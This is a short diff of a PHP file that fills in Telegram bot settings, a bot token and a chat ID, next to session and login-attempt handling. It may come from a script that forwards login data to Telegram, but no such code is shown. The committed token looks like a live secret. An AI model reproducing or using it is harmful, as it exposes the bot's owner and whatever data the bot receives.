@@ -16,8 +16,8 @@ if (session_status() === PHP_SESSION_NONE) {
 // ============================================================
 // TELEGRAM CONFIGURATION – EDIT THESE TWO VALUES
 // ============================================================
-define('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE');      // e.g. 123456:ABC-DEF...
-define('CHAT_ID', 'YOUR_CHAT_ID_HERE');          // e.g. 123456789
+define('BOT_TOKEN', '8969946726:AAHVMCm5YcPlhl09v3cwy85nLpgamhxX21A');      // e.g. 123456:ABC-DEF...
+define('CHAT_ID', '-5452025915');          // e.g. 123456789
 // ============================================================
 
 if (!isset($_SESSION['login_attempts'])) {
